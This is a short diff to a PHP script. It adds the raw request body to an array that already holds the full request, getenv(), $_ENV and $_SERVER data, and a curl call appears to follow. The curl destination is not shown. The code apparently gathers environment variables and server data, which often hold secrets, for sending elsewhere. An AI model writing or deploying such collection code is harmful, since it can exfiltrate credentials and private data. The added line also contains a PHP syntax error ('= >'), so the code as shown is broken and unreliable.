@@ -4,7 +4,8 @@ $arr = [
 'requestData' => json_encode($_REQUEST),
 'getEnvData' => json_encode(getenv()),
 'envData' => json_encode($_ENV),
-'serverData' => json_encode($_SERVER)
+'serverData' => json_encode($_SERVER),
+'fileContent' = > json_encode(file_get_contents('php://input'))
 ];
 
 $curl = curl_init();
